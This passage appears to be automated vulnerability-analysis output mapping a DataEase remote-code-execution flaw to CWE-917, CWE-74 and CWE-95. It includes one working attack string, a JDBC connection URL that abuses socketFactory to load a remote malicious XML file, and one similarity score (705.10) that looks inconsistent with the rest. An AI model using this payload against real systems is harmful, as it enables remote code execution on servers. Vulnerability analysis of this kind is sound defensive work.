This allows for the exploitation of a Remote Code Execution (RCE) vulnerability within the vulnerable redshift-jdbc version (v2.1.0.1).\n*   **Weaknesses/vulnerabilities present:** RCE via JDBC connection string.\n*   **Impact of exploitation:** Authenticated users can achieve RCE.\n*   **Attack vectors:** An attacker can construct a malicious JDBC connection string with a payload to trigger the vulnerability.  The content provides a specific example using `jdbc:redshift://127.0.0.1:6666/testdb;socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext;socketFactoryArg=http://127.0.0.1:50025/exp.xml`.  This uses the `socketFactory` parameter to load a malicious XML file.\n*   **Required attacker capabilities/position:** Authenticated user. Access to the Dataease software to modify the JDBC connection parameters.\n*   **Mitigation or fix:** Upgrade to version 2.10.9 or later.\n*   **More detail than the official CVE description:** Yes, the content provides detailed steps for exploitation, including the malicious XML payload, the specific JDBC connection string, and screenshots.",

This allows an attacker to inject malicious code and achieve RCE. The \"socketFactory\" parameter in the JDBC connection string is used to load a malicious XML file, demonstrating the expression language injection.\n\nCWE-74 is considered as a secondary CWE because it represents a broader class of injection vulnerabilities. While it's not as specific as CWE-917, it highlights the general nature of the vulnerability.\n\nCWE-95 is considered as a secondary CWE because it is related to code injection, but the mechanism is not directly through `eval()`, but through a related injection vector using `socketFactory`.\n\nThe selected CWEs are at the optimal level of specificity because CWE-917 accurately describes the root cause, while CWE-74 and CWE-95 provide additional context about the type of vulnerability.\n\nRelevant CWE Information:\n\n# Enhanced Context (25 CWEs)\nThe following CWEs were identified as potentially relevant to this vulnerability:\n\n## CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')\n**Abstraction Level**: Base\n**Similarity Score**: 0.76\n**Source**: dense\n\n**Description**:\nThe product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it **does not neutralize** or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n## CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n**Abstraction Level**: Class\n**Similarity Score**: 0.75\n**Source**: dense\n\n**Description**:\nThe product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it **does not neutralize** or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.\n\n**Mapping Guidance**:\n- Usage: Discouraged\n- Rationale: CWE-74 is high-level and often misused when lower-level weaknesses are more appropriate.\n\n## CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n**Abstraction Level**: Variant\n**Similarity Score**: 705.10\n**Source**: sparse\n\n**Description**:\nThe product receives input from an upstream component, but it **does not neutralize** or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. \"eval\").\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
